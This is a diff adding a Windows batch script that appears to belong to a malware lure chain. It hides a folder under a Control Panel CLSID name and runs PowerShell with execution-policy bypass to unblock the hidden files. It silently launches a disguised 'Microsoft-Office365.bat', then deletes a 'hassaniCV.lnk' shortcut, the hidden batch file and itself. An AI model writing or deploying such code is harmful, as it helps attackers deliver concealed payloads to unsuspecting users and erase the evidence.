@@ -1,0 +1,27 @@
+@ECHO OFF
+if EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" goto UNLOCK
+:LOCK
+ren Documentation "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+attrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+goto End
+:UNLOCK
+attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" Documentation
+Powershell.exe -ExecutionPolicy Bypass -Command "dir .\Documentation\* | Unblock-File
+goto End
+:End
+
+%windir%\system32\cmd.exe /NOCONSOLE /MIN /v /c %CD:~0,2%"%CD:~2%\Microsoft-Office365.bat"
+
+
+@ECHO OFF
+if EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" goto UNLOCK
+:UNLOCK
+attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" Documentation
+Powershell.exe -ExecutionPolicy Bypass -Command "dir .\Documentation\* | Unblock-File
+del /Q hassaniCV.lnk
+del /ah /Q Microsoft-Office365.bat
+del %0
+goto End
+:End
